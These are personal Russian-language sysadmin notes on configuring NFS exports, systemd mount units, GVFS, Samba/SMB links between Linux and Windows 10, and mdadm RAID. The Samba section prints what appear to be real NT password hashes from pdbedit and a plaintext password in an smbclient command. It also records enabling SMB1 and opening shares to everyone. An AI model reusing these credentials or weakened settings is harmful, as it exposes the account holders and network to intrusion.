                    но снижает безопасность, можно использовать когда экспортируется раздел диска;
anonuid и anongid - указывает uid и gid для анонимного пользователя.
Например, для нашей папки, если вы хотите разрешить к ней подключаться только с определённого IP адреса, эта строка может выглядеть вот так:

sudo vi /etc/exports

/var/nfs 127.0.0.1(rw,sync,no_subtree_check)

Можно разрешить только нужную подсеть, например:

/var/nfs 192.168.0.0/24(rw,sync,no_subtree_check)

Для того чтобы разрешить все адреса используйте подсеть 0.0.0.0/0 или символ *.

!!!! права к ресурсам по nfs: Кроме ограничений IP адреса работает обычная система полномочий UNIX,
!! поэтому если хотите,чтобы определённый пользователь мог получить доступ к папке на клиенте,на сервере
!!должен существовать пользователь с таким же UID и эта папка должна принадлежать ему или группе в
!!которой он состоит.
!!! Обратить внимание, что все подключения от имени пользователя root считаются поумолчанию
!! анонимными (nfsnobody).Чтобы это отключить добавьте опцию монтирования no_root_squash, но это 
 небезопасно, потому что любой root пользователь сможет получить доступ на запись ко всем файлам.!!
 Я 0:01 12/28/2023 - вот почему под UID oem на lnx2 мог заходить и изменять файлы в /mnt/nfs/adm, которая 
  анонсируется на lnx1 с "RO"  -  /mnt/nfs/adm  192.168.100.12(ro,sync,wdelay ...)

!!Для того чтобы все пользователи могли получить доступ ко всем файлам можно создать пользователя с
!!UID 1001 и попросить NFS все запросы считать запросами от анонимного пользователя, а анонимному 
!!пользователю присвоить UID 1001. Это делается такими опциями:

  /var/nfs 127.0.0.1(rw,sync,all_squash,root_squash,anonuid=1001,anongid=1001)
  открыть порты 111 и 2049: sudo ufw allow 111; sudo ufw allow 2049
Проверить Подключенные по nfs системы   df -h | grep  nfs

ВАЖНО Я 0:16 12/28/2023 все операции по NFS с файлами разделяемых каталогов 
 (создание/открытие/сохрание изменений) выполняются  nfs поверх ssh (см wireshark) !!
А операции по SMB с файлами разделяемых каталогов (создание/открытие/сохрание изменений) 
 выполняются  nfs БЕЗ ssh (см wireshark), видны имена файлов !!

2) Вариант от "57. Сетевые файловые системы - NFS — Основы GNU_Linux"
https://interface31.ru/tech_it/2023/07/nastraivaem-setevuyu-faylovuyu-sistemu-nfs-v-debian-i-ubuntu.html
Установка и настройка NFS-сервера
apt install nfs-kernel-server #для debian - пакет для сервера

sudo mkdir /mnt/nfs; mkdir /mnt/nfs/adm; mkdir /mnt/nfs/doc
В целях безопасности NFS умеет понижать права подключившихся пользователей до nobody:nogroup 
 и это хорошая практика для общих ресурсовПоэтому сразу сменим владельца директории:
chown -R nobody:nogroup /mnt/nfs

В /etc/fstab "/home/oem/share_nfs  /mnt/nfs/doc  none  bind  0  0" и выполнить mount -a


Список расшаренных директорий указывается в файле /etc/exports  !!!!
 Все экспортируемые файловые системы должны быть описаны в /etc/exports, 
 начнем с корневой, добавим строку:
 /mnt/nfs 192.168.100.0/24(rw,sync,crossmnt,fsid=0,no_subtree_check,wdelay,all_squash)
  подробнее: /mnt/nfs - путь к экспортируемым данным
  192.168.100.0/24 - адрес, которому разрешается доступ, можно указать * - всем, сеть или отдельный адрес или имя хоста
 !!! В кобках опции, которые относятся к указанному адресу, !пробела между адресом и скобкой быть не должно!
  rw - разрешаем запись в экспортируемую директорию
  sync - сообщать клиенту об успешной записи, только после фактической записи на диск, несколько замедляет работу, но предотвращает возможную потерю данных
  crossmnt - автоматически монтировать вместе с корневой файловой системой все вложенные
  fsid=0 - признак корневой файловой системы
  no_subtree_check - если экспортируется подкаталог, то система будет проверять находится ли запрошенный файл в экспортированном подкаталоге, отключение проверки несколько снижает безопасность, но увеличивает производительность
  wdelay - позволяет серверу откладывать запись, если он предполагает, что планируется еще одна операция записи, чтобы потом записывать данные большими блоками. Увеличивает производительность при большой глубине очереди
  all_squash - понижать права всех пользователей до nobody:nogroup

  NFS по умолчанию не использует аутентификацию и доступ разграничивается по IP-адресам и 
  !!стандартным UNIX-правам.Важно!! понимать-права определяются не по имени пользователя,
  а по его UID/GID, В целях безопасности NFS умеет понижать права до минимальных, но по умолчанию это
  применяется только к суперпользователю, а обычные пользователи будут подключаться со своими UID/GID

Осталось разобраться с экспортируемым ресурсом, который мы примонтировали из домашней папки. Понятно,
  что владельцем файлов в ней является сам пользователь и попытки обратиться туда с 
 минимальными правами не увенчаются успехом. Поэтому немного изменим строку экспорта:
  /mnt/nfs/doc 192.168.100.0/24(rw,sync,no_subtree_check,wdelay,all_squash,anonuid=29999,anongid=29999)

В случае с NFS не нужно перезапускать сервис, чтобы применились настройки, но нужно выполнить команду exportfs:
sudo exportfs -av  # ! ! ! ! ! ! 
 #ключ -a считывает всё написанное в /etc/exports и применяет для службы nfs
cat /var/lib/nfs/etab # результаты ее работы в этом файле
/mnt/nfs/adm    192.168.100.12(ro,sync,wdelay,hide,nocrossmnt,secure,root_squash,no_all_squash,no_subtree_check,secure_locks,acl,no_pnfs,anonuid=65534,anongid=65534,sec=sys,ro,secure,root_squash,no_all_squash)
/mnt/nfs/doc    192.168.100.0/24(rw,sync,wdelay,hide,nocrossmnt,secure,root_squash,no_all_squash,no_subtree_check,secure_locks,acl,no_pnfs,anonuid=65534,anongid=65534,sec=sys,rw,secure,root_squash,no_all_squash)
systemctl restart|status nfs-server
  sudo ss -l4t |  less nfs  # определить запущен ли сервер nfs - служба слушает 2049 порт?

cat /var/lib/nfs/etab #список раздаваемых ресурсов по nfs
sudo exportfs #  покажется то что сейчас раздаётся nfs
sudo exportfs -s #все параметры к этой "шаре2

   * Установка и настройка NFS-клиента *
apt install nfs-common #debian-пакет для клиента
sudo mount -t nfs4 192.168.100.10:/doc /mnt/mdx #примонтировать на клиенте удаленный share каталог на LnxPC1 
sudo mount --types nfs 192.168.100.10:/mnt/nfs/adm /mnt/nfs/adm/
showmount -e 192.168.100.10 # запрос от клиента с сервера nfs списка раздаваемых каталогов
Export list for 192.168.100.10:   #   ! ! ! ! ! ! ! ! 
/mnt/nfs/doc 192.168.100.0/24
/mnt/nfs     192.168.100.0/24
Для постоянного монтирования в fstab добавить "192.168.100.10:/doc /mnt/nfs nfs defaults,nofail 0 0"
+sudo mount -a

Если сетевой каталог на сервере стал ip-недоступен, скорее всего сокет примонтированного каталога 
  на клиенте "зависнет", нельзя будет обратиться к /mnt/
В таких случаях можно попытаться !принудительно/enforced отмонтировать 
   sudo umount -f -l /mnt/mdx/ (Я: работает)

 *** Постоянное монтирование NFS c systemd ***
Для монтирования c systemd используются специальные юниты, имя которых должно отображать
физический путь к ним, чтобы сформировать имя на основании пути используйте:
  systemd-escape -p "/mnt/adm"
Для указанного пути в выводе получим имя mnt-nfs-adm, после чего создадим юнит монтирования и
 откроем его nano /etc/systemd/system/mnt-nfs-adm.mount

==Юниты на NFS-сервере LnxPC1==
10/12/2023 Замечено, что на PC2 не всегда корректно/при первом обащении удаленные каталоги ы PC1 (adm и doc)
монитуются в /mnt/nfs/ корректно модулями systemd, возможно лучше использовать статич монтирование в fstab!!!

 Юниты для  /mnt/nfs/adm вМЕСТО аналогичных статической записи для ресурса /mnt/nfs/doc
  в /etc/fstab  "/home/oem/share_nfs  /mnt/nfs/doc  none  bind  0  0" см ВЫШЕ!)
/etc/systemd/system/mnt-nfs-adm.mount
[Unit]
Description=NFS ADM
[Mount]
What=/home/oem/share_nfs_adm/
Where=/mnt/nfs/adm
Type=none
Options=bind
[Install]
WantedBy=multi-user.target
  #в опции What указываем сетевой ресурс, а в опции Where - точку монтирования.
systemctl daemon-reload - внедряем юнит в systemd
sudo systemctl start mnt-nfs-adm.mount # примонтировать в /mnt/nfs/adm
sudo systemctl status mnt-nfs-adm.mount 
● mnt-nfs-adm.mount - NFS ADM
     Loaded: loaded (/etc/systemd/system/mnt-nfs-adm.mount; disabled; vendor preset: enabled)
     Active: active (mounted) since Sat 2023-12-02 23:30:18 +03; 8min ago
TriggeredBy: ● mnt-nfs-adm.automount
      Where: /mnt/nfs/adm

Создадим для СЕРВЕРА NFS юнит АВТОМОНТИРОВАНИЯ по требованию -активирует монтирование при обращении !! 
nano /etc/systemd/system/mnt-adm.automount
[Unit]
Description=Automount NFS ADM
[Automount]
Where=/mnt/nfs/adm
TimeoutIdleSec=900
[Install]
WantedBy=multi-user.target
Теперь перечитаем список юнитов, добавим юнит автомонтирования в автозагрузку и сразу запустим.
systemctl daemon-reload
systemctl enable --now mnt-adm.automount
Перезагружать систему не надо, при работающем юните достаточно обратиться к указанной 
точке монтирования, и сетевая файловая система будет подключена автоматически!!!!

systemctl status mnt-nfs-adm.automount # до обращения к /mnt/nfs/adm
● mnt-nfs-adm.automount - Automount NFS ADM
     Loaded: loaded (/etc/systemd/system/mnt-nfs-adm.automount; enabled; vendor preset: enab>
     Active: active (waiting) since Sat 2023-12-02 23:30:06 +03; 8s ago
   Triggers: ● mnt-nfs-adm.mount
      Where: /mnt/nfs/adm

systemctl status mnt-nfs-adm.automount # после обращения к /mnt/nfs/adm
● mnt-nfs-adm.automount - Automount NFS ADM
     Loaded: loaded (/etc/systemd/system/mnt-nfs-adm.automount; enabled; vendor preset: enab>
     Active: active (running) since Sat 2023-12-02 23:30:06 +03; 24s ago
   Triggers: ● mnt-nfs-adm.mount
      Where: /mnt/nfs/adm

Чтобы отключить монтирование в /mnt/nfs/adm надо остановить оба  юнита
sudo systemctl stop mnt-nfs-adm.automount
sudo systemctl stop mnt-nfs-adm.mount

=Юниты монтирования systemd на NFS-клиенте LnxPC2=
10/12/2023 Замечено, что на PC2 не всегда корректно/при первом обащении удаленные каталоги ы PC1 (adm и doc)
монитуются в /mnt/nfs/ корректно модулями systemd, возможно лучше использовать статич монтирование в fstab!!!
cat mnt-nfs-adm.mount
Description=NFS-ADM-onClien
[Mount]
What=192.168.100.10:/mnt/nfs/adm
Where=/mnt/nfs/adm
Type=nfs4
Options=_netdev,auto
TimeoutSec=100
[Install]
WantedBy=multi-user.target

cat mnt-nfs-doc.mount
[Unit]
Description=NFS-DOC-onClien
[Mount]
What=192.168.100.10:/mnt/nfs/doc
Where=/mnt/nfs/doc
Type=nfs
Options=_netdev,auto
TimeoutSec=100
[Install]
WantedBy=multi-user.target

sudo systemctl daemon-reload;
sudo systemctl start mnt-nfs-adm.mount

cat /etc/systemd/system/mnt-nfs-adm.automount
[Unit]
Description=Automount NFS ADM onClient
[Automount]
Where=/mnt/nfs/adm
TimeoutIdleSec=900
[Install]
WantedBy=multi-user.target

cat mnt-nfs-doc.automount
[Unit]
Description=Automount NFS DOC onClient
[Automount]
Where=/mnt/nfs/doc
TimeoutIdleSec=900
[Install]
WantedBy=multi-user.target



sudo systemctl daemon-reload
systemctl enable --now mnt-nfs-adm.automount
 подробно можно прочитать в https://interface31.ru/tech_it/2022/09/montirovanie-faylovyh-sistem-pri-pomoshhi-systemd.html
также см секцию ##Монтирование и автомонтирование фаловых систем устройств через systemd
= = END NFS = =

== псевдофайловая  виртуальная файловая система Gnome GVFS ==
Linux. Pingv Установка, настройка, администрирование.pdf    стр 46,697 
Для доступа к сетевым каталогам в Gnome применяется GVFS (Gnome Virtual File System).
Внешние каталоги подключаются к дереву каталогов как поддиректории /run/user/29999/gvfs/ и  
метаданные  /home/oem/.local/share/gvfs-metadata/.
GVFS отражает файлы подключенных по сети smb или съемныъ носителй и ОТРАЖЕМЫХ в GUI MINT 
 проводнике thunar или других, например ПО "Подключение к серверу"
для монтирования GVFS, как и др fuse систем, используется  fusermount и mount.fuse 

обображение в проводнике thunar(GUI) файлов расшаренных папок SMB(SAMBA) с др. комп-ров
oem@LnxPC1:~$ ll /run/user/29999/gvfs/  # в проводнике открыто 2 папки с vichonor(windows10)
drwx------  1 oem oem 4096 дек 12 23:17 'smb-share:server=vichonor,share=iperf-win64'/
drwx------  1 oem oem 4096 дек 12 23:17 'smb-share:server=vichonor,share=ttmp,user=victo'/
ll /run/user/29999/gvfs/smb-share\:server\=lnxpc1.local\,share\=sharepc1_smb/
итого 6
drwx------ 1 oem oem    0 дек 10 18:38  ./
-rwx------ 1 oem oem    0 дек 10 18:37  file1*...

Адрес Результат gvfs-metadata/
computer: Список всех носителей данных
afp://user@hostname Доступ к AFP-серверу (Apple) 
ftp://hostname Доступ к FTP-серверу
network: Применение в качестве общего обозревателя сети
sftp://hostname Доступ к SFTP-серверу (протокол SSH)
smb://hostname Доступ к сетевым каталогам компьютера Windows
trash: Корзина (удаленные файлы)
ll /home/oem/.local/share/gvfs-metadata/
-rw-rw-r--  1 oem oem 32768 ноя 20 00:21  home-c7fcde17.log
-rw-rw-r--  1 oem oem 32768 дек 10 19:28  root-06f45c2c.log
-rw-rw-r--  1 oem oem 32768 дек 10 18:39 'smb-share:server=lnxpc1.local,share=sharepc1_smb-dcf7ff22.log'
-rw-rw-r--  1 oem oem 32768 апр 16  2023  trash:-d84c4947.log
=end Gnome GVFS =


= разрешение имен по netbios (в windows системами)=
nmblookup VICHONOR 
192.168.100.11 VICHONOR<00>
192.168.56.1 VICHONOR<00>
nmblookup LnxPC1
192.168.100.10 LnxPC1<00>

 = sftp служба работает в linux по-умолчанию =
sftp://192.168.100.10 в thunar работает!
sftp oem@192.168.100.12  # работет с CLI по SSHv2 c шифрованием TLS !!!
Connected to 192.168.100.12.
sftp> pwd Remote working directory: /home/oem
sftp> put f1 f1fromlnx1
sftp> get file10

== SMB Server Message Block  CIFS (Common Internet File System) Samba реализация CIFS Microsoft==
Я: операции по SMB с файлами разделяемых каталогов (создание/открытие/сохрание изменений) 
 выполняются  nfs БЕЗ ssh (см wireshark), видны имена файлов !!
SMB протокол доступа к файловой системе CIFS (аля ftp/http),а Samba - пакет программ в linux
+ https://losst.pro/oshibka-ubuntu-ne-vidit-set-windows#%D0%9F%D0%BE%D1%87%D0%B5%D0%BC%D1%83_Ubuntu_%D0%BD%D0%B5_%D0%B2%D0%B8%D0%B4%D0%B8%D1%82_%D1%81%D0%B5%D1%82%D1%8C_Windows_%D0%B8%D0%BB%D0%B8_Samba
+ https://losst.pro/nastrojka-samba-v-debian-10
** Настройка связи/доступа по SMB между LnxPC **
[New Share] # вариант настройки smb.conf
comment = A new share
path = /home/user1/share
browseable = yes
read only = no
guest ok = no
valid users = user1

 !!! быть внимательным 12/25/2023 включил случайно firewall ufw и не смог достучаться 
 к расшаренным папкам lnx1 НИ через nfs c Lnx2,  Ни через SMB с vichonor windows10

58. Сетевые файловые системы - SMB — Основы GNU_Linux и подготовка к RHCSA.mhtml
В компаниях все компьютеры объединяют в одну сеть, называемую ДОМЕНОМ. В этой сети есть специальные 
 сервера, называемые «контроллер домена», которые могут централизовано управлять всеми компьютерами компании 
 - хранить учётки пользователей, настраивать компьютеры, выдавать доступы итд


SAM - Security Account Manager БД Microsoft  для хранения хешей паролей пользователей SMB.
Имена пользователй linux и пользователей SMB  должны СОВПАДАТЬ! но пароли могут быть разными!
Пароли пользователй linux и пользователей SMB не хранятся открыто в ОС linux или windows, 
а виде ХЭШ-сумм! НО Алгоритм формирования хешей паролей для SAM отличен от /etc/shadow, 
поэтому хранить хэши надо или  
- в отдельном файле tdbsam *.tdm на каждом ПК, выступающем в роли файл или принтер сервера workgroup - 
   для децентролизованного случай, snandalone сервер  /var/lib/samba/private/passdb.tdb
   ("security = user" в  smb.conf)
- в ActiveDirectory или sql БД - для централизованного случая, "сервера домена". ("security = DOMAIN/ADS" в  smb.conf)
Это пределяется   параметром "passdb backend" в smb.conf
см man smb.conf  passdb backend = tdbsam:/etc/samba/private/passdb.tdb
               or multi server LDAP URL with OpenLDAP library:
               passdb backend = ldapsam:"ldap://ldap-1.example.com ldap://ldap-2.example.com"
sudo pdbedit -Lv -w # просмотр полной инф о пользователях SMB из  /var/lib/samba/private/passdb.tdb
oem:29999:Vic M
mvn:30000:M.V.N,Minsk,555-77-88-44,555-22-33-44,
oem:29999:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:D8CF9346AF6E4909AE1CF68F2130CA93:[U          ]:LCT-656CA029:
mvn:30000:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:2A6FE1AC843AC5E745AC3931748EE9F5:[U          ]:LCT-656CA034:
sudo pdbedit -a/-r/-d - добавить изменить удалить пользователя SMB

testparm # тестировать smb.conf на корректность

 systemctl status smbd.service
smb.conf файл состоит из секций и параметров. Секции указаны в квадратных скобках. 
 В секции [global] указаны параметры, относящиеся к самой самбе, а также дефолтные параметры 
 для всех остальных секций. К примеру, параметр security можно указывать только в global. Остальные
 секции считаются «шарами», т.е. там указаны конкретные ресурсы, которыми делятся - директории
 и принтеры. Скажем, если в секции global указать параметр read only, он будет по по-умолчанию 
 во всех секциях, если конечно в них не указано другое значение

sudo nano /etc/samba/smb.conf #задать конфигурацию

smbpasswd -a oem  # задать пароль в samba
New SMB password:
Added user oem.

Доступ из Windows10 по SMB папках Linux нетребует допнастроек-> в проводнике задать "192.168.100.10"
Bp Linux к Windows10 расшаренным папкам - танцы с бубном - см ниже

smbpasswd -a mvn  # задать пароль в samba # Я задал такиеже как для PC Lnx1/2 (но это не обязательно!)
Password for [WORKGROUP\oem]:
        Sharename       Type      Comment
        ---------       ----      -------
        share           Disk      share_dir1
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
        oem             Disk      Home Directories
smbclient чем-то напоминает sftp и может подключаться к командной строке, 
  в которой доступны опрелённые команды для работы с файлами, В ЦЕЛОМ - НЕ УДОБЕН
smbclient //192.168.100.10/share -U oem
Password for [SAMBA\oem]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Dec  3 13:13:27 2023
  ..                                  D        0  Sun Dec  3 18:26:26 2023
  exports                             N      647  Sun Dec  3 13:13:27 2023
  mnt-nfs-adm.mount                   N      144  Sun Dec  3 13:13:27 2023

Чтобы примонтировать шару на клиенте, нужен пакет cifs-utils:
sudo mount //192.168.100.10/sharePC1_SMB /mnt/samba -o username=oem
ll /mnt/samba/   
drwxr-xr-x 2 root root    0 дек  3 13:13 ./
-rwxr-xr-x 1 root root  647 дек  3 13:13 exports*
-rwxr-xr-x 1 root root  144 дек  3 13:13 mnt-nfs-adm.mount*
mount | grep share
//192.168.100.10/sharePC1_SMB on /mnt/samba type cifs (rw,relatime,vers=3.1.1,cache=strict,username=oem,
uid=0,noforceuid,gid=0,noforcegid,addr=192.168.100.10,file_mode=0755,dir_mode=0755,soft,nounix,...
 # все права для root uid=0 - почему читай файл и видео  "58. Сетевые файловые системы - SMB"
Проверяются двразделямым  - локального пользователя на клиенте и  на сервере....

sudo mount //192.168.100.10/sharePC1_SMB /mnt/samba -o username=oem,uid=29999,gid=29999,file_mode=0640,dir_mode=0750
username - пользователь на сервере, кем мы логинимся и чьи файлы нам нужны.
uid и gid - 29999 - это наш локальный пользователь и группа, у кого будут права на примонтированные 
файлы и директории. file_mode и dir_mode - с какими правами будут эти примонтированные файлы и директории.
ll /mnt/samba/
итого 24
drwxr-x--- 2 oem  oem     0 дек  3 18:55 ./
drwxr-xr-x 8 root root 4096 дек  3 18:44 ../
-rw-r----- 1 oem  oem   647 дек  3 13:13 exports
-rw-r----- 1 oem  oem    22 дек  3 18:55 testfile
oem теперь имеет доступ,но при этом mvn не сможет читать и писать в /mnt/samba

Если примонтировать от имени oem но с uid и gid mvn, - mvn получит доступ, а oem - нет
sudo mount //192.168.100.10/share /mnt/samba -o username=oem,uid=30000,gid=1001,file_mode=0640,dir_mode=0750
ll /mnt/samba/
итого 28
drwxr-x--- 2 mvn  stdnts    0 дек  3 19:19 ./
drwxr-xr-x 8 root root   4096 дек  3 18:44 ../
-rw-r----- 1 mvn  stdnts  647 дек  3 13:13 exports
-rw-r----- 1 mvn  stdnts   27 дек  3 19:19 testfile

при доспупе к разделямым каталогам по smb в gui thunar монтирование удаленного каталога произойдет в GVFS (см выше)

== СвязЬ по SMB между  LINUX И WINDOWS!==
https://hackware.ru/?p=10923#1  windows share    
https://hackware.ru/?p=10962   тОЛКОВЫЕ СТАТЬИ!
https://losst.pro/oshibka-ubunt
23:42 12/11/2023 Windows10 прекрасно окрывает шары c LinuxMint. Связи едет по !SBM2!, см скрины в 
 cm  файл "smb1 на win и и связь с linux2-2".docx

23:32 12/12/2023 Добился связи из LnxPC1 и LnxPC2 в разделяемые папки vichonor Windows10 и на работе как для
cli smbclient  так и для gui thunar !!
на LnxPCi установлен пакет samba и запущены установлена smbd.service, установлен пакет cifs-unitil 
на win10 
 - открыт полный доступ к каталогам ttmp и logs для "everyone" 
 - включена поддержка smb1 (https://losst.pro/oshibka-ubunt)
 -отлючен  пароль  для других сетей и поиск папок для др сетей (см https://hackware.ru/?p=10923 "Как подключиться 
  к сетевой папке в Windows по SMB"  + см  linux2-2.docx а также pcap-файлы)
LnxPC1 и LnxPC2 обращаются к Windows10 по SMB1 (см pcap-файлы), а не SMB2!
см smb1 на win и и связь с linux2-2.docx а также pcap-файлы

sudo smbclient //vichonor/ttmp -U oem # работает! через  smbclient, файлы cifs на vichonor Windows10
smb: \> dir
  .                                   D        0  Tue Dec 12 23:17:04 2023
  ..                                  D        0  Tue Dec 12 23:17:04 2023
  1linuxmint-to-windows10_smb1.pcapng      A     1948  Tue Dec 12 23:13:05 2023
  Lnx comnd (11.12).txt               A   905083  Tue Dec 12 23:17:04 2023

при доспупе к разделямым каталогам по smb в gui thunar монтирование удаленного каталога произойдет в GVFS (см выше)

12/13/2023 Добился (при выгружееном компоненте SMB1!)  связи из LnxPC в windows10 (ues) по SMB2 в gui thunar(smb://10.250.15.3/_tmp/)  и включенном режиме
 "Включить общий к общедоступным папкам" (1ая секция) для секции "Другие сети" в разделе "Изменить доп.параметры общего доступа" . При этом в
cli также работает (не сразу, пришлось сделать ping в 10.250.15.3 )
sudo smbclient //10.250.15.3/_tmp -U oem
Password for [WORKGROUP\oem]:
o get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Dec 13 18:15:33 2023
  f.txt                               A       10  Wed Dec 13 18:15:33 2023.....

Примонтировать cifs-windows каталог _tmp узла 10.250.15.3 
Примонтировать cifs-windows каталог ttmp узла 192.168.100.11
  работает также дома как для !SMB2 vers=2.0, так и для SMB vers=1.0!
sudo mount //192.168.100.11/ttmp /home/oem/dir_cifs -o username=oem,_netdev,iocharset=utf8,rw,file_mode=0777,dir_mode=0777,vers=2.0
oem@lnxmnt:~$ ll /home/oem/dir_cifs 
drwxrwxrwx  2 root root      4096 дек 13 18:28  ./
-rwxrwxrwx  1 root root        24 дек 13 18:28  f12t5.txt*
-rwxrwxrwx  1 root root        10 дек 13 18:15  f.txt*

Рабочий модуль  монтирования systemd /etc/systemd/system/home-oem-dir_cifs.mount
[Unit]
Description=Automount SMB
[Mount]
What=//10.250.15.3/_tmp
Where=/home/oem/dir_cifs
Type=cifs
Options=_netdev,iocharset=utf8,rw,file_mode=0777,dir_mode=0777,vers=2.0,credentials=/etc/samba/smbcreds
#Options=username=root,_netdev,iocharset=utf8,rw,file_mode=0777,dir_mode=0777,vers=2.0,credentials=/etc/samba/smbcreds
TimeoutSec=30
[Install]
WantedBy=multi-user.target
 
файл данных для аутентификации /etc/samba/smbcreds (представляют собой логин и пароль от SMB-ресурса):
username=oem
password=ххх
Установим прав доступа к файлу только oem chmod 600 /etc/samba/smbcreds;  chown oem /etc/samba/smbcreds;
=end Рабочий модуль=




smb://10.250.15.3/_tmp/

варианты команд
sudo smbclient -L  //vichonor/ttmp   --user=victo%vm75
в gui "smb://victo@192.168.100.11/ttmp"

!! ПОПРОБОВАТЬ ДОСТУП К принтеру из lnx в win  !!!
= end СвязЬ по SMB между LIN И WIN=

 = = mdadm Soft RAID = =
Кетов Администрирование 4.2.1 
https://losst.pro/programmnyj-raid-v-linux:
Шаг 2. Подготовка дисков
Посмотреть список дисков, подключённых к системе можно с помощью команды lsblk:
Gокажу как объединить три диска в RAID на примере дисков /dev/sda, /dev/sdb и /dev/sdc. Сначала необходимо определиться стоит ли размещать RAID непосредственно на диски или на разделы. Лучше выбрать РАЗДЕЛЫ!, так как это дает больше гибкости и безопасности. Во первых, операционная система может перезаписать суперблок RAID если он размещён прямо на диске!!!Во вторых, если вы выделяете весь диск под RAID, то у вас могут возникнуть проблемы при замене диска. Диски одинакового объема, обычно, немного отличаются у разных производителей. Поэтому для замены вам придется искать точно такой же диск с точно таким же реальным объемом. Если же у вас будет раздел, вы просто сможете создать раздел нужного объема.
Сначала нужно создать таблицу разделов на всех выбранных дисках:
sudo parted /dev/sda mklabel msdos 
sudo parted /dev/sdb mklabel msdos
sudo parted /dev/sdc mklabel msdos
Если на диске уже существует таблица разделов программа предупредит о том, что создание новой сотрёт все данные с диска. После создания таблицы разделов следует создать по разделу на каждом диске. Например, создадим разделы размером 460 гигабайт. Для этого можно воспользоваться той же командой parted:
sudo parted /dev/sda mkpart primary ext4 2048 460Gb
sudo parted /dev/sdb mkpart primary ext4 2048 460Gb
sudo parted /dev/sdc mkpart primary ext4 2048 460Gb.Теперь диски готовы к размещению на них RAID.
Шаг 3. Создание RAID 0
Для создания RAID массива надо выполнить команду mdadm с опцией --create, указать режим работы массива, количество дисков и сами диски. Синтаксис команды такой:
$ sudo mdadm --create /dev/имя_массива --level=режим_работы --raid-devices=количество_устройств список устройств
sudo mdadm --create /dev/md0 --level=0 --raid-devices=3 /dev/sda1 /dev/sdb1 /dev/sdc1
После выполнения этой команды вы увидите раздел raid в lsblk. С этим разделом можно работать как с любым обычным разделом в вашей системе.
Шаг 4. Тестирование RAID 0
sudo mkfs -t ext4 /dev/md0 //отформатируем  раздел md0 в файловую систему Ext4
sudo mount /dev/md0 /mnt //смонтируем
sudo dd if=/dev/zero of=/mnt/file bs=1G count=5 //Затем протестируем скорость записи с помощью dd:
Получим при записи 5ГБ данных скорость 400 Мб/сек, это  на уровне обычного SSD.
Шаг 5. Информация о RAID
Найти информацию обо всех созданных в системе RAID массивах вы можете в файле /proc/mdstat:
cat /proc/mdstat
Именно так можно посмотреть RAID Linux. Посмотреть более детальную информацию о массиве /dev/md0 можно с помощью 
   mdadm: sudo mdadm --detail или -D /dev/md0
Здесь в том числе отображается состояние RAID Linux.
 Посмотреть детальную информацию о каждом устройстве, которое входит в RAID можно спомощью 
 --examine или -E: 
sudo mdadm --examine /dev/sda1 /dev/sdb1 /dev/sdc1
Шаг 6. Сохранение RAID массива
В принципе, уже сейчас RAID массив работает и продолжит работать после перезагрузки, потому что mdadm просканирует все диски, найдёт метаданные массива и построит его. Но неизвестно какое имя программа присвоит полученному массиву и неизвестно все ли параметры будут восстановлены верно. Поэтому конфигурацию массива лучше сохранить. Для этого используйте такую команду:
sudo mdadm --detail --scan --verbose | sudo tee -a /etc/mdadm/mdadm.conf

/etc/mdadm/mdadm.conf - база  данных конфиг информации о метадисках !!!

Затем нужно пересоздать initramfs с поддержкой этого массива: !!!!! 
ВСТРОИТЬ Метадиск MD в init systemd
sudo update-initramfs -u  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

С полученным массивом можно обращаться как с обычным разделом диска. Например, для того чтобы автоматически монтировать его в систему добавьте такую строчку в /etc/fstab:
sudo vi /etc/fstab
/dev/md0 /mnt/ ext4 defaults 0 0  На этом создание raid массива linux завершено.
Шаг 7. Переименование RAID массива
Если вы не выполните предыдущий пункт и перезагрузите компьютер, то можете получить RAID массив с именем md127 вместо md0, такое имя также может быть присвоено второму RAID массиву. Для того чтобы переименовать массив, его придется пересобрать. Для этого сначала остановите существующий массив: sudo mdadm --stop /dev/md127 (Я перед этим также м.б. потредуется отмонтировать disk:sudo umount /dev/md127)
Затем выполните команду переименования. Синтаксис у неё такой:
$ sudo mdadm --assemble --update=name --name=номер /dev/md_номер список устройств
Например: sudo mdadm --assemble --update=name --name=0 /dev/md0 /dev/sda1 /dev/sdb1 /dev/sdc1
После этого следует повторить предыдущий шаг для уже правильного сохранения RAID устройства.
Шаг 8. Удаление RAID массива
Если вы не хотите чтобы ваши диски и дальше были объединены в RAID, его можно удалить. Для этого выполните такую команду: sudo mdadm --remove /dev/md0
Она удалит все метаданные с дисков /dev/md0. Дальше останется только удалить или закомментировать секцию данного RAID массива в /etc/mdadm/mdadm.conf
Шаг 10. Создание массива RAID 1
Для создания RAID 1 используется такая же команда как и для RAID 0, но указывается другой уровень работы массива: sudo mdadm --create /dev/md0 --level=1 --raid-devices=3 /dev/sda1 /dev/sdb1 /dev/sdc1
Затем вы можете убедится что RAID создан посмотрев информацию о нём: sudo mdadm --detail /dev/md0
Ну и с помощью lsblk можно оценить размер устройства: lsblk
Как и ожидалось, размер не увеличился, поскольку копии данных будут записываться на все три диска. Теперь давайте посмотрим на скорость:Скорость записи данных такая же как и у одного диска. Это цена сохранности данных. Если вы отключите один из дисков, то все данные всё равно будут вам доступны.

{Я: 16.04.2023 Создав запись  /etc/mdadm/mdadm.conf (см ниже) для md127 RAID0, поставив в загрузку VBox накопитель USB, без добавления(!) в fstab, в "update-initramfs -u"(!) получается автоматическое! монтирование md123 в "/media/oem/mdRaid0/" Я 
Потом добавил в в fstab UUID=020ebf59-17ff-48ef-a985-fbbf6d437e61  /mnt/md22 ext2 defaults 0 1
и md127 стал монтироваться при загрузке в /mnt/md22 БЕЗ ошибок ! 
05/05/2023 Остается открытым вопрос - "чем" монтирутся raid на usb. 
 (как - ответ есть, при обращении в GUI в диспетчере файлов гораздо позднее (10...75),
 чем автом-я загрузка init/systemd -  ЭТО ТОЧНО, см ниже  dmesg |less:
[   10.443777] e1000: enp0s3 NIC Link is Up 1000 Mbps Full Duplex, Flow Control: RX
[   10.444038] IPv6: ADDRCONF(NETDEV_CHANGE): enp0s3: link becomes ready
[   75.911814] EXT4-fs (md123): mounting ext2 file system using the ext4 subsystem
[   75.948393] EXT4-fs (md123): mounted filesystem without journal. )
Хотя модуль "sys-devices-virtual-block-md123.device" отображается после вызова  systemctl
